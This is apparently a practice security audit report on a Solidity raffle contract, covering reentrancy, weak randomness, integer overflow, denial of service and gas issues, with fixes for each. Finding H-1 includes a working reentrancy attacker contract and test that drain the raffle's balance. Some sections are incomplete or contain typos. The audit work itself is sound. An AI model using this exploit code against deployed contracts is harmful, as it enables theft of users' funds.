
# HIGH

### [H-1] Reentrancy attack in `PuppyRaffle::refund` function, allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.
In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we updates the `PuppyRaffle::players`

```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0),"PuppyRaffle: Player already refunded, or is not active");
        payable(msg.sender).sendValue(entranceFee);
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle til the contract balance is  drained.
**Impact:** All fees paid by the raffle entrants could be stolen by the malicious participants.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `receive` function that calls `PuppyRaffe::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract. draining the contract balance.

**Proof of Code:**

<details>
<summary>
Code
</summary>

`PuppyRaffle.t.sol` is the test case for the reentrancy attack.

```javascript
function test_attack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: enteranceFee * 4}(players);

        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
        console2.log("Raffle Balance: ", uint256(raffleBalanceBefore));

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
            puppyRaffle
        );

        uint256 attackerBalanceBefore = address(attackerContract).balance;
        console2.log("Attacker Balance: ", uint256(attackerBalanceBefore));

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        //Attack
        vm.startPrank(attacker);
        attackerContract.attack{value: enteranceFee}();
        vm.stopPrank();

        uint256 raffleBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(attackerContract).balance;

        console2.log("Raffle Balance After: ", uint256(raffleBalanceAfter));
        console2.log("Attacker Balance After: ", uint256(attackerBalanceAfter));
    }
```

This is the attacker contract

```javascript
    contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 enteranceFee;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        enteranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRaffle.enterRaffle{value: enteranceFee}(attackers);
        puppyRaffle.refund(4);
    }

    receive() external payable {
        if (address(puppyRaffle).balance > 0 ether) {
            puppyRaffle.refund(4);
        }
    }
}

```

</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making an external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0),"PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allow users to influence or predict the winner and influence and predict puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number. A predictable number is not good random number. pf
Malicious users can manipulate these values or know them ahead of time to choosethe winner of the raffle themselves.

*Note:* This additionally means users could front-run this function and call `PuppyRaffle::refund` if they see they are not winner.

**Impact:** Any user can influence the winner of the raffle, wining the money and selecting the `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffle.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that predict when/how to particiate. See the [soldity blog on prevrando](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipute their `msg.sender` value to result in their address being used to generated the winner!.
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://medium.com/better-programming/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Migitation:**
Consider using a cryptographically provable random number generator such as Chainlink VRF.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In solidity version prior to `0.0.8` interger are subjected to integer overflows.

```javascript
      uint64 myVar=type(uint64).max  
      -> 18446744073709551615  
      
      myVar = myVar + 1;
      -> 0  
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFee`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fes, leaving fees permanently stuck in the contract.

**Proof of Concept:**

<details>

1. We conclude a raffle of 4 players.
2. We then have 89 players enter the new raffle.
3. Let suppose the `totalFees` is `18446744073709551615`.
4. One new player can overflow the `totalFees` to `0.
5. `totalFees` will be:

```javascript
totalFees = totalFees+ uint64(fee);
//aka
totalFees = 18446744073709551615 + 1
totalFees = 0
```

</details>

**Recommended Migitation:**

1. Use a mew vrsion of solidity, and a `uint256` instead of `uint64` for `PuppyRaffle::totalFees`
2. You could also user the `SafeMath` library of OpenZepplin for version `0.7.6` of solidity, however you would still have a hard ti,e with `uint64` type if too many fees are collected.

---

# MEDIUM

### [M-1] Looping through players array to check for updates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrents

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who ehter right when the raffle state will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
 // DoS Attack
 for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(
                    players[i] != players[j],
                    "PuppyRaffle: Duplicate player"
                );
            }
        }
```

**Impact:** The gas cost for raffle enterants will greatly increase as more players enter the raffle. Discouraging later users for entering, and causing a rush at the start of a raffle to be one of the first enterants in the queue.
An attacker might make the `PuppyRaffle::players` array so big, that no one else enters, guarenteeing themeselvers the win.
**Proof Of Code:**
**Recommended Mitigation:**

### [M-2] Dangerous strict equalities in `PuppyRaffle::withdrawFees` function can lead users `entranceFee` stuck forever

**Descrition:** Mishandling the balance in contract `PuppyRaffle` can lead to permanent `entranceFee` stuck, no one can withdraw his `entranceFee` via `PuppyRaffle::withdrawFees` because of strict equalities.

```javascript
require(address(this).balance == uint256(totalFees),"PuppyRaffle: There are currently players active!");
```

**Proof of Concept:** Although you could use `selfdestruct` to send ETH to this contract in order for the values  to match and withdraw the fees, this is clearly not intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.

**Recommended Mitigtion:** There are a few possible mitigiation, remove the balance check from `PuppyRaffle::withdrawFees`

```diff
-     require(address(this).balance == uint256(totalFees),"PuppyRaffle: There are currently players active!");
```

There are more attack vectors with that final `require`, so we recommend removing it regardless.

---

### [M-3] Smart contract wallets raffle winners without a `receive` or `fallback` function will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible fr resetting the lottery. However, if th winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lost due to the duplicate check and lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many time, making a lottery reset difficult.

Also, true winners would not get paid out and someone else could take their money!

**Proof of Concept:**

1. 10 smart contract wallet enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are few options to mitigate this issue.

1. Do not allow smart contrat wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winers can pull thier funds out themselves, with a new `claimPrize` function, putting the owness on the winner to claim their prize. (Recommended).

> Pull over Push, means allow the users to pull their money not you push their money to them.

# LOW

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existant players and for player at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the netspec, it will also return  if the player is not in the array.

```javascript
  // @return the index of the array, if they are not active, it returns 0
  function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, tehy are the first enterant
2. PuppyRaffle::getActivePlayerIndex returns 0
3. User think they have not entered correctly due to the function documnetation

**Recommended Migitation:** The easiest recommendation would be to revert if the player is not in the array insted of returning  0.

You could aslo reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns `-1` if the player is not active.

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading from a constant or immutable variable.
Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

---

### [G-2] Storage variables in a loop should be cached

Everytime you call `player.lenght` you read from storage, as opposed to memory which is more gas efficient.

```diff
+       uint256 playerLength=player.length;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLength; j++) {
```

---

### [I-1]: Unspecific Solidity Pragma

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version, instead of `pragma solidity ^0.7.6;`, use specific `sloc` verison `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 4](src/PuppyRaffle.sol#L4)
    pragma solidity ^0.7.6;
please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

---

### [I:2] Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.
<details><summary>2 Found Instances</summary>
- Found in src/PuppyRaffle.sol [Line: 84](src/PuppyRaffle.sol#L84)

```javascript
            feeAddress = _feeAddress;
```

- Found in src/PuppyRaffle.sol [Line: 251](src/PuppyRaffle.sol#L251)
            feeAddress = newFeeAddress;

</details>

### [I:3] `PuppyRaffle::selectWinner` should follow CEI, which is not a best practice

It's best to keep code clean and follow CEI (Checks, Effects, Interactions).

```diff
-       (bool success, ) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId)
+       (bool success, ) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");

```

### [I-4] Use of magic numbers are discouraged

It can be confusing to seen number literals in a codebase, and it's much more readable if number are given name.

```javascript
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead, you could use:

```javascript
       uint256 public constant PRIZE_POOL_PERCENTAGE=80;
       uint256 public constant FEE_PERCENTAGE=20;
       uint256 public constant POOL_PRECESION=100;
```

### [I-5] State changes are missing events in `PuppyRaffle:: withdrawFees`

There are state variable changes in this function but no event is emitted. Consider emitting an event to enable offchain indexers to track the changes.

### [I-6] `PuppyRaffle::_isActivePlayer` function is never used and should be removed

The `PuppyRaffle::_isActivePlayer` function is not used anywhere in the contract so it increases the contract size, which ultimatly leads to gas in-efficiency.
